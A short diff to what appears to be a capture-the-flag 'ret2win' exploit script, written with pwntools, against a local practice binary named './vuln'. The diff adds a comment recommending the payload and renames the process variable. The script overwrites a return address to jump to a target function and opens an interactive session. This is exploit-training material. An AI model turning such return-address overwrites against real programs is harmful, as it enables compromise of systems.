@@ -1,7 +1,9 @@
+# you can try this payload to get ret2win
+
 from pwn import *
 
 elf = context.binary = ELF('./vuln')
-p = process()
+ly = process()
 
 target = p64(0x401176)
 ret = 0x4011ea
@@ -14,6 +16,6 @@ payload = flat(
     target
 )
 
-p.sendline(payload)
+ly.sendline(payload)
 
-p.interactive()
+ly.interactive()
